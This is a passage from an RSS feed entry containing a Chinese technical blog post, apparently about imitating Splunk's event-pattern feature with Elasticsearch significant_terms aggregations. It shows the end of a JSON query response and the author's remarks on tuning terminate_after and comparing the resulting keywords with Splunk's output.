            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;search_queue_metrics&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5849&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;62.445888186014706&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5849&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5849&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMKILjo3PexoUulx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:16:31.777 +0800 INFO  Metrics - group=search_concurrency, name=search_queue_metrics, enqueue_seaches_count=0, avg_time_spent_in_queue=0.000000, max_time_spent_in_queue=0, current_queue_size=0, largest_queue_size=0, min_queue_size=0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--_::._+____-_=,_=,_=,_=,_=,_=,_=,_=,_=,_=,_=,_=,_&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5848&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;keyword&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5848&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;buckets&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;key&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;max_ready&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;doc_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5848&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;62.45673734610123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;bg_count&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5848&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hit&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;total&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5848&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;max_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;hits&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_index&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logstash-2016.07.18&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_type&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AVX-RMJbLjo3PexoUuk5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_score&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;1.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;_source&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;07-15-2016 14:17:02.776 +0800 INFO  Metrics - group=searchscheduler, dispatched=1, skipped=0, total_lag=1, max_ready=0, max_pending=0, max_lag=1, window_max_lag=0, window_total_lag=0, max_running=0, actions_triggered=0, completed=1, total_runtime=0.189, max_runtime=0.189&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;响应体中可以看到因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;terminate_after&lt;/code&gt; 设得还是过大，所以还没到中止条数就被 kill 了。实际只扫描了 370173 条数据。那么我们下次就可以把 &lt;code class=&quot;highlighter-rouge&quot;&gt;terminate_after&lt;/code&gt; 调成 10000 得了。&lt;/p&gt;
&lt;p&gt;然后就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;significant_terms&lt;/code&gt; 返回的关键词们。跟之前 splunk 的截图相比，我们可以发现，不是完全一样的效果，但是还是有部分关键词是一致的。比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;smallest_size&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;total_k_processed&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;search_health_metrics&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;var&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;workers&lt;/code&gt; 等。&lt;/p&gt;
&lt;p&gt;可以说，作为一个山寨品，这个做法是行得通的~&lt;/p&gt;
    &lt;hr&gt;
    
    &lt;hr&gt;
  &lt;!-- JiaThis Button BEGIN --&gt;
&lt;div class=&quot;jiathis_style&quot;&gt;
&lt;span class=&quot;jiathis_txt&quot;&gt;分享到：&lt;/span&gt;
&lt;a class=&quot;jiathis_button_tsina&quot;&gt;新浪微博&lt;/a&gt;
&lt;a class=&quot;jiathis_button_weixin&quot;&gt;微信&lt;/a&gt;
&lt;a class=&quot;jiathis_button_renren&quot;&gt;人人网&lt;/a&gt;
&lt;a class=&quot;jiathis_button_ydnote&quot;&gt;有道云笔记&lt;/a&gt;
&lt;a class=&quot;jiathis_button_gmail&quot;&gt;Gmail邮箱&lt;/a&gt;
&lt;a class=&quot;jiathis_button_twitter&quot;&gt;Twitter&lt;/a&gt;
&lt;a class=&quot;jiathis_button_googleplus&quot;&gt;Google+&lt;/a&gt;
&lt;a class=&quot;jiathis_button_hi&quot;&gt;百度空间&lt;/a&gt;
&lt;a class=&quot;jiathis_button_fb&quot;&gt;Facebook&lt;/a&gt;
&lt;a class=&quot;jiathis_button_douban&quot;&gt;豆瓣&lt;/a&gt;
&lt;a href=&quot;http://www.jiathis.com/share?uid=1589850&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;更多&lt;/a&gt;
&lt;a class=&quot;jiathis_counter_style&quot;&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var jiathis_config={
	data_track_clickback:true,
	summary:&quot;&quot;,
	ralateuid:{
		&quot;tsina&quot;:&quot;1035836154&quot;
	},
	shortUrl:false,
	hideMore:false
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://v3.jiathis.com/code/jia.js?uid=1589850&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
&lt;!-- JiaThis Button END --&gt;
&lt;!-- UY BEGIN --&gt;


&lt;!-- UY END --&gt;
  &lt;/div&gt;

</description>
        <pubDate>Mon, 18 Jul 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-07-18-event-pattern-a8113a95f.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-07-18-event-pattern-a8113a95f.html</guid>
        
        
        <category>chenlinux</category>
        
      </item>
    
  </channel>
</rss>
